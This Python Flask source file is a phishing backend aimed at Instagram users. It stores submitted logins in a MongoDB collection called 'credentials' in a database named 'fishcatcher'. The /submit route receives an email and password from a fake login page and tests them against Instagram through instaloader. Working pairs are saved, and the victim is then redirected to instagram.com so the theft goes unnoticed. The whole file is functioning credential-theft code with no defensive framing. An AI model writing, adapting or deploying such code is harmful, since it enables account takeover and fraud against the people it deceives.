from flask import Flask, request, render_template, jsonify, redirect
import instaloader
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import os
import logging

app = Flask(__name__)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

uri = os.getenv("MONGODB_URI")

client = MongoClient(uri, server_api=ServerApi('1'))
db = client.fishcatcher
collection = db.credentials

def instaloader_check(email, password):
    loader = instaloader.Instaloader()

    try:
        # Intentar iniciar sesión
        loader.login(email, password)
        return "Inicio de sesion exitoso"
    except instaloader.exceptions.BadCredentialsException:
        print("Credenciales incorrectas")
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        print("La cuenta requiere autenticación de dos factores")
    except Exception as e:
        error_message = str(e).lower()  # Convertir a minúsculas para facilitar la búsqueda
        if "fail" in error_message and "status" in error_message:
            return "Credenciales incorrectas"
        elif "checkpoint" in error_message:
            print("La cuenta está bloqueada por un checkpoint de Instagram")
        elif "two_factor" in error_message:
            print("La cuenta requiere autenticación de dos factores")
        elif "does not exist" in error_message:
            return "Usuario no existe"
        else:
            print(f"Error desconocido: {error_message}")

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para el procesamiento del formulario
@app.route('/submit', methods=['POST'])
def submit():
    logger.info("Endpoint /submit alcanzado")

    try:
        #email = request.form['email']
        email = request.form.get('email')
        #password = request.form['password']
        password = request.form.get('password')
        #logger.info(f"Datos recibidos en /submit: email={email}, password={password}")
        result = instaloader_check(email, password)

        if result == "Inicio de sesion exitoso":
            collection.insert_one({"email": email, "password": password})
            logger.info("Datos almacenados correctamente en MongoDB.")
        else:
            logger.error("CREDENCIALES INVÁLIDAS, NO SE REALIZA GUARDADO EN BASE DE DATOS")
        #return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
        return redirect("https://instagram.com")
    except Exception as e:
        logger.error(f"Error al almacenar credenciales: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(port=5001)
